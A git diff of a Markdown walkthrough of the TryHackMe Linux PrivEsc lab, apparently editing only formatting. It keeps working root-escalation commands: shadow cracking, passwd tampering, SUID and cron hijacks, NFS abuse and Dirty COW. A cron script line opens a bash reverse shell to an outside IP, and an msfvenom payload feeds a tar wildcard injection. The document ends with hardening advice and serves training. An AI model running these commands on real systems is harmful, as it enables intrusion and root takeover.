@@ -2,7 +2,7 @@
 
 ## Overview
 
-Full walkthrough of the TryHackMe Linux PrivEsc room against a Debian VM, chaining 18 distinct root-level privilege escalation techniques including MySQL UDF abuse, shadow/passwd file tampering, sudo and LD_PRELOAD misconfigurations, cron writable scripts and wildcard injection, SUID binary exploitation, bash function/PS4 hijacking, insecure SSH keys, NFS no_root_squash abuse, and the Dirty COW kernel exploit (CVE-2016-5195) to obtain root.
+Full walkthrough of the TryHackMe Linux PrivEsc room against a Debian VM, chaining 18 distinct root-level privilege escalation techniques including **MySQL UDF abuse**, shadow/passwd file tampering, sudo and **LD_PRELOAD** misconfigurations, cron writable scripts and wildcard injection, **SUID binary exploitation**, bash function/PS4 hijacking, insecure SSH keys, NFS no_root_squash abuse, and the **Dirty COW** kernel exploit (**CVE-2016-5195**) to obtain root.
 
 **Platform:** TryHackMe | **Room:** Linux PrivEsc | **Difficulty:** Easy-Medium
 
@@ -10,7 +10,7 @@ Full walkthrough of the TryHackMe Linux PrivEsc room against a Debian VM, chaini
 
 **Techniques Covered:**
 
-MySQL UDF → Shadow File → Writable /etc/passwd → Sudo Misconfigs → Cron Jobs → Wildcard Injection → SUID Exploitation → Bash Debugging → SSH Keys → NFS → Dirty COW
+MySQL UDF, Shadow File, Writable /etc/passwd, Sudo Misconfigs, Cron Jobs, Wildcard Injection, SUID Exploitation, Bash Debugging, SSH Keys, NFS, Dirty COW
 
 ---
 
@@ -44,7 +44,7 @@ select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 
 ## 2. World-Readable /etc/shadow
 
-The `/etc/shadow` file was world-readable, exposing all password hashes.
+The /etc/shadow file was world-readable, exposing all password hashes.
 
 ```bash
 cat /etc/shadow
@@ -58,7 +58,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 <img src="03_shadow_hash_cracked.png" width="800">
 
-**Result:** `root:password123`
+**Result:** **root:password123**
 
 ```bash
 su root
@@ -70,7 +70,7 @@ su root
 
 ## 3. World-Writable /etc/shadow
 
-The `/etc/shadow` file was also world-writable. A new password hash was generated and used to replace the root hash directly.
+The /etc/shadow file was also world-writable. A new password hash was generated and used to replace the root hash directly.
 
 ```bash
 mkpasswd -m sha-512 newpassword
@@ -84,7 +84,7 @@ su root
 
 ## 4. World-Writable /etc/passwd
 
-The `/etc/passwd` file was world-writable. A new password hash was generated and inserted in place of the `x` placeholder for root, then a new root-level user was appended.
+The /etc/passwd file was world-writable. A new password hash was generated and inserted in place of the *x* placeholder for root, then a new root-level user was appended.
 
 ```bash
 openssl passwd newpassword
@@ -156,7 +156,7 @@ echo 'bash -i >& /dev/tcp/192.168.203.76/4444 0>&1' >> /usr/local/bin/overwrite.
 
 ## 7. Cron Job - PATH Hijacking
 
-The cron PATH variable started with `/home/user`. A script named `overwrite.sh` placed in the home directory was executed as root by the cron job.
+The cron PATH variable started with /home/user. A script named overwrite.sh placed in the home directory was executed as root by the cron job.
 
 ```bash
 echo '#!/bin/bash' > /home/user/overwrite.sh
@@ -171,7 +171,7 @@ echo 'chmod +xs /tmp/rootbash' >> /home/user/overwrite.sh
 
 ## 8. Cron Job - Wildcard Injection
 
-A cron job ran `tar` with a wildcard in `/home/user`. Files named after tar command line options were created to inject a reverse shell payload.
+A cron job ran tar with a wildcard in /home/user. Files named after tar command line options were created to inject a reverse shell payload.
 
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.203.76 LPORT=4444 -f elf -o shell.elf
@@ -187,7 +187,7 @@ nc -nvlp 4444
 
 ## 9. SUID - Exim CVE-2016-1531
 
-The SUID binary `/usr/sbin/exim-4.84-3` was vulnerable to a known local privilege escalation exploit.
+The SUID binary /usr/sbin/exim-4.84-3 was vulnerable to a known local privilege escalation exploit.
 
 ```bash
 /home/user/tools/suid/exim/cve-2016-1531.sh
@@ -199,7 +199,7 @@ The SUID binary `/usr/sbin/exim-4.84-3` was vulnerable to a known local privileg
 
 ## 10. SUID - Shared Object Injection
 
-The SUID binary `/usr/local/bin/suid-so` attempted to load a shared object from the user's home directory. A malicious shared object was compiled in its place.
+The SUID binary /usr/local/bin/suid-so attempted to load a shared object from the user's home directory. A malicious shared object was compiled in its place.
 
 ```bash
 strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
@@ -214,7 +214,7 @@ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc
 
 ## 11. SUID - PATH Environment Variable
 
-The SUID binary `/usr/local/bin/suid-env` called `service` without an absolute path. A malicious `service` binary was compiled and the PATH was prepended with the current directory.
+The SUID binary /usr/local/bin/suid-env called service without an absolute path. A malicious service binary was compiled and the PATH was prepended with the current directory.
 
 ```bash
 gcc -o service /home/user/tools/suid/service.c
@@ -227,7 +227,7 @@ PATH=.:$PATH /usr/local/bin/suid-env
 
 ## 12. SUID - Bash Function Hijacking
 
-The SUID binary `/usr/local/bin/suid-env2` used the absolute path `/usr/sbin/service`. A bash function was defined with the same name and exported to override it.
+The SUID binary /usr/local/bin/suid-env2 used the absolute path /usr/sbin/service. A bash function was defined with the same name and exported to override it.
 
 ```bash
 function /usr/sbin/service { /bin/bash -p; }
@@ -272,7 +272,7 @@ su root
 
 ## 15. Insecure SSH Key
 
-A world-readable root SSH private key was found in `/.ssh/root_key`. The key was copied to Kali and used to SSH directly as root.
+A world-readable root SSH private key was found in /.ssh/root_key. The key was copied to Kali and used to SSH directly as root.
 
 ```bash
 chmod 600 root_key
@@ -285,7 +285,7 @@ ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa r
 
 ## 16. NFS Root Squashing Disabled
 
-The `/tmp` NFS share had root squashing disabled. A SUID shell binary was created on the Kali machine as root and mounted to the target.
+The /tmp NFS share had root squashing disabled. A SUID shell binary was created on the Kali machine as root and mounted to the target.
 
 ```bash
 mount -o rw,nfsvers=3 10.66.189.164:/tmp /tmp/nfs
@@ -300,7 +300,7 @@ chmod +xs /tmp/nfs/shell.elf
 
 ## 17. Dirty COW (CVE-2016-5195)
 
-A kernel exploit was used to overwrite the SUID `/usr/bin/passwd` binary with a shell. This exploit abuses a race condition in the Linux kernel's copy-on-write mechanism.
+A kernel exploit was used to overwrite the SUID /usr/bin/passwd binary with a shell. This exploit abuses a race condition in the Linux kernel's copy-on-write mechanism.
 
 ```bash
 gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
@@ -349,7 +349,7 @@ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 - Set correct permissions on /etc/shadow (640) and /etc/passwd (644)
 - Audit sudo rules and remove unnecessary NOPASSWD entries
 - Restrict LD_PRELOAD and LD_LIBRARY_PATH in sudo configuration
-- Set correct permissions on cron scripts — only root should be able to write
+- Set correct permissions on cron scripts. Only root should be able to write
 - Audit cron PATH variable and avoid putting user directories first
 - Avoid using wildcards in cron commands
 - Keep software patched and up to date
